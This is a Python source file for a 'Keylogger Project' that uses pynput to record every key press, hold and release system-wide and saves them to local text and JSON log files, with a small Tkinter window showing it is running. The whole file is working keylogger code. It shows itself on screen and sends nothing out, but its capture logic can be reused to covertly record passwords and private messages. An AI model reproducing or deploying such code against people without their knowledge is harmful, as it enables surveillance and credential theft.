import tkinter as tk
from pynput import keyboard
import json
import threading  # Import threading module

# Create the main Tkinter window
root = tk.Tk()
root.geometry("300x300")
root.title("Keylogger Project")

# Label to show keylogging activity
label = tk.Label(root, text="Keylogger Running...", font=("Arial", 12))
label.pack(pady=20)

# Global variables
key_list = []
x = False
key_strokes = ""

# Function to update text file
def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

# Function to update JSON file
def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log, indent=4)

# Function to handle key press event
def on_press(key):
    global x, key_list

    try:
        key_char = key.char if hasattr(key, 'char') else str(key)
    except AttributeError:
        key_char = str(key)

    if x == False:
        key_list.append({'Pressed': key_char})
        x = True
    else:
        key_list.append({'Held': key_char})

    update_json_file(key_list)

# Function to handle key release event
def on_release(key):
    global x, key_list, key_strokes

    try:
        key_char = key.char if hasattr(key, 'char') else str(key)
    except AttributeError:
        key_char = str(key)

    key_list.append({'Released': key_char})

    if x == True:
        x = False

    key_strokes += key_char + " "
    update_txt_file(key_strokes)

    update_json_file(key_list)

# Function to start keylogger in a separate thread
def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Print message when keylogger starts
print("[+] Running Keylogger successfully!")
print("[!] Saving the key logs in 'logs.json' and 'logs.txt'")

# Start the keylogger in a separate thread
keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
keylogger_thread.start()

# Start the Tkinter main loop
root.mainloop()
